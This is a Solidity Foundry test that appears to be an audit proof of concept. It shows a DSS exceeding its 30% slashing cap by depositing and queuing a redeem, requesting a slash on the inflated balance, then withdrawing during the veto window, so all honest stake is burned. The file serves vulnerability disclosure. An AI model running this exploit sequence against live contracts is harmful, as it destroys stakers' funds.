// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.25;

import "../helpers/OperatorHelper.sol";

contract Poc28 is OperatorHelper {
    function test_dssBypassesMaxSlashablePercentage() public {
        stake_vaults_to_dss();
        IVault vault = IVault(address(vaults[0]));
        address dssActor = address(dss);

        // honest stakers hold 1000 in the vault; DSS limit is 30%
        assertEq(vault.totalAssets(), 1000);
        uint256 maxAllowedSlash = 1000 * core.getDssMaxSlashablePercentageWad(dss) / Constants.MAX_SLASHING_PERCENT_WAD;
        assertEq(maxAllowedSlash, 300);

        // DSS deposits 3000 and immediately queues a redeem of all its shares
        depositToken.mint(dssActor, 3000);
        vm.startPrank(dssActor);
        depositToken.approve(address(vault), 3000);
        uint256 dssShares = vault.deposit(3000, dssActor, 0);
        IERC20(address(vault)).approve(address(vault), dssShares);
        bytes32 key = vault.startRedeem(dssShares, dssActor);
        vm.stopPrank();
        assertEq(vault.totalAssets(), 4000);

        // redeem matures after MIN_WITHDRAWAL_DELAY (9 days); only then the DSS requests the slash
        skip(Constants.MIN_WITHDRAWAL_DELAY);
        uint96[] memory pct = new uint96[](1);
        pct[0] = uint96(core.getDssMaxSlashablePercentageWad(dss));
        address[] memory slashVaults = new address[](1);
        slashVaults[0] = address(vault);
        vm.prank(dssActor);
        SlasherLib.QueuedSlashing memory queued = core.requestSlashing(
            SlasherLib.SlashRequest({operator: operator, slashPercentagesWad: pct, vaults: slashVaults})
        );
        // earmark = 30% of the inflated 4000
        assertEq(queued.earmarkedStakes[0], 1200);

        // inside the 2-day veto window the DSS pulls its own funds back out
        vault.finishRedeem(key);
        assertEq(depositToken.balanceOf(dssActor), 3000);
        assertEq(vault.totalAssets(), 1000);

        skip(Constants.SLASHING_VETO_WINDOW);
        uint256 burnedBefore = depositToken.balanceOf(address(0));
        vm.prank(dssActor);
        core.finalizeSlashing(queued);

        uint256 slashed = depositToken.balanceOf(address(0)) - burnedBefore;
        emit log_named_uint("allowed slash (30% of honest stake)", maxAllowedSlash);
        emit log_named_uint("actually slashed", slashed);
        assertEq(slashed, 1000);
        assertGt(slashed, maxAllowedSlash);
        assertEq(vault.totalAssets(), 0);
        // DSS paid nothing for the extra damage
        assertEq(depositToken.balanceOf(dssActor), 3000);
    }
}
